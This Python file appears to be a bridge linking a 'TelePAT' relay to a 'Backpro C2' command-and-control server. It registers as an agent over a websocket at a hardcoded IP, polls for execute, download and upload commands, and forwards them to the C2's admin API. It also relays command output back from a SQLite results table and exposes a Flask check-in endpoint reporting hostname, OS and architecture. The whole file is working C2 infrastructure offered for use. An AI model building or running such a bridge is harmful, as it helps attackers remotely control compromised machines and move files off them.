from SlotSDK import SlotSDK
import requests
import sqlite3
import threading
import time
import socket
import platform
import os
from flask import Flask, request, jsonify


RELAY_URL = "ws://192.168.230.133:8081/ws"  
SLOT_ID = "backpro-c2-agent"
BACKPRO_URL = "http://127.0.0.1:5000"       
HTTP_PORT = 5001                            
AGENT_ID_FILE = "agent_id.txt"


AGENT_MAPPING = {
    12: "cab183da-f2c6-4eab-b6cf-1376f2d4cde8"   
}


command_mapping = {}


app = Flask(__name__)

class BridgeState:
    sdk = None

GLOBAL_AGENT_ID = None

def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] [Bridge] {msg}")


@app.route('/', methods=['GET', 'POST'])
@app.route('/checkin', methods=['GET', 'POST'])
@app.route('/register', methods=['GET', 'POST'])
@app.route('/agent', methods=['GET', 'POST'])
def agent_checkin():
    return jsonify({
        "status": "ok",
        "agent_id": GLOBAL_AGENT_ID or 1,
        "slot_id": SLOT_ID,
        "version": "1.0.0",
        "hostname": socket.gethostname(),
        "os": platform.system().lower(),
        "arch": platform.machine()
    }), 200


def forward_to_backpro(command_text="", arguments="", telepat_agent_id=None, telepat_cmd_id=None, cmd_type="execute", file_path=""):
    try:
        if telepat_agent_id not in AGENT_MAPPING:
            log(f"[Error] No UUID mapping for TelePAT agent_id {telepat_agent_id}")
            return False

        backpro_uuid = AGENT_MAPPING[telepat_agent_id]

        
        payload = {
            "agent_uuid": backpro_uuid,
            "command_type": cmd_type,        
            "command_text": command_text,
            "arguments": arguments,
            "file_path": file_path
        }

        headers = {"Content-Type": "application/json"}

        r = requests.post(
            f"{BACKPRO_URL}/api/admin/commands",
            json=payload,
            headers=headers,
            timeout=15
        )

        if r.status_code in (200, 201):
            try:
                resp_data = r.json()
                backpro_cmd_id = resp_data.get("command_id") or resp_data.get("id")
            except:
                backpro_cmd_id = None

            if backpro_cmd_id and telepat_cmd_id:
                command_mapping[backpro_cmd_id] = telepat_cmd_id
                log(f"[Success] Mapped Backpro ID {backpro_cmd_id} → TelePAT ID {telepat_cmd_id}")

            log(f"[Success] Command forwarded | Backpro ID: {backpro_cmd_id} | Type: {cmd_type} | Path: {file_path}")
            return True
        else:
            log(f"[Error] Forward failed: HTTP {r.status_code} | Response: {r.text}")
            return False

    except Exception as e:
        log(f"[Exception] Forwarding to Backpro failed: {e}")
        return False


def send_results_to_telepat():
    try:
        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()

        cursor.execute("""
            SELECT r.id, r.result_data, r.command_id
            FROM Results r
            WHERE r.id > (SELECT COALESCE(MAX(result_id), 0) FROM sent_results)
        """)
        rows = cursor.fetchall()

        for result_id, result_data, backpro_cmd_id in rows:
            telepat_cmd_id = command_mapping.get(backpro_cmd_id)

            if not telepat_cmd_id:
                log(f"[Warning] No TelePAT mapping for Backpro command_id {backpro_cmd_id}")
                continue

            if not BridgeState.sdk or not BridgeState.sdk.connected:
                log("[Warning] SDK not connected")
                continue

            result_payload = {
                "stdout": result_data.strip() if result_data else "",
                "stderr": "",
                "exit_code": 0,
                "duration": 0,
                "finished": True
            }

            try:
                BridgeState.sdk.send_result(telepat_cmd_id, result_payload)
                log(f"[Success] Result sent | TelePAT ID: {telepat_cmd_id} | Backpro ID: {backpro_cmd_id}")

                conn.execute("INSERT OR IGNORE INTO sent_results (result_id) VALUES (?)", (result_id,))
                conn.commit()
            except Exception as e:
                log(f"[Error] Send result failed: {e}")

        conn.close()

    except Exception as e:
        log(f"[Error] send_results_to_telepat: {e}")


def command_polling_loop():
    global GLOBAL_AGENT_ID
    while True:
        if (BridgeState.sdk and BridgeState.sdk.registered and 
            BridgeState.sdk.connected and GLOBAL_AGENT_ID):

            cmd = BridgeState.sdk.request_commands(
                agent_id=GLOBAL_AGENT_ID,
                count=1,
                timeout=10
            )

            if cmd:
                telepat_cmd_id = cmd.get("command_id")
                cmd_type = cmd.get("command_type", "execute").lower()  
                input_data = cmd.get("input_data", {})

                
                if cmd_type in ("download", "upload"):
                    command_text = cmd_type  
                    file_path = input_data.get("path", "").strip()
                    arguments = input_data.get("arguments", "")
                else:
                    command_text = input_data.get("command", "").strip()
                    arguments = input_data.get("arguments", "")
                    file_path = ""

                if not command_text and cmd_type not in ("download", "upload"):
                    log("[Warning] Empty command received — skipping")
                    continue

                log(f"[New Command] TelePAT ID: {telepat_cmd_id} | Type: {cmd_type.upper()} | Command: '{command_text}' | Path: '{file_path}'")

                
                success = forward_to_backpro(
                    command_text=command_text,
                    arguments=arguments,
                    telepat_agent_id=GLOBAL_AGENT_ID,
                    telepat_cmd_id=telepat_cmd_id,
                    cmd_type=cmd_type,
                    file_path=file_path
                )

                if not success:
                    log("[Error] Failed to forward command to Backpro")

        time.sleep(5)


def background_loop():
    while True:
        send_results_to_telepat()
        time.sleep(10)


if __name__ == "__main__":
    log("Starting TelePAT → Backpro Bridge")

    conn = sqlite3.connect("db.sqlite")
    conn.execute("CREATE TABLE IF NOT EXISTS sent_results (result_id INTEGER PRIMARY KEY)")
    conn.commit()
    conn.close()

    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=HTTP_PORT, use_reloader=False), daemon=True).start()
    log(f"Local HTTP server started on port {HTTP_PORT}")

    if os.path.exists(AGENT_ID_FILE):
        with open(AGENT_ID_FILE, "r") as f:
            try:
                GLOBAL_AGENT_ID = int(f.read().strip())
                log(f"Loaded TelePAT agent_id: {GLOBAL_AGENT_ID}")
            except:
                GLOBAL_AGENT_ID = None

    BridgeState.sdk = SlotSDK(RELAY_URL, SLOT_ID, lambda msg: None, heartbeat_interval=60)
    threading.Thread(target=BridgeState.sdk.run, daemon=True).start()

    while not (BridgeState.sdk.registered and BridgeState.sdk.connected):
        time.sleep(1)

    log("Connected to TelePAT relay")

    if not GLOBAL_AGENT_ID:
        log("Registering new agent in TelePAT...")
        result = BridgeState.sdk.send_agent_registration(
            description="Backpro C2 Bridge",
            hostname=socket.gethostname(),
            os_name=platform.system().lower(),
            arch=platform.machine(),
            version="1.0.0",
            timeout=60
        )
        if isinstance(result, int):
            GLOBAL_AGENT_ID = result
            with open(AGENT_ID_FILE, "w") as f:
                f.write(str(GLOBAL_AGENT_ID))
            log(f"New agent registered: {GLOBAL_AGENT_ID}")
        else:
            log("[Error] Agent registration failed")
    else:
        log(f"Using existing TelePAT agent_id: {GLOBAL_AGENT_ID}")

    threading.Thread(target=command_polling_loop, daemon=True).start()
    threading.Thread(target=background_loop, daemon=True).start()

    log("Bridge fully active! Send commands from TelePAT panel.")
    log(f"Agent mapping: TelePAT ID {list(AGENT_MAPPING.keys())} → Backpro UUID {list(AGENT_MAPPING.values())}")

    while True:
        time.sleep(60)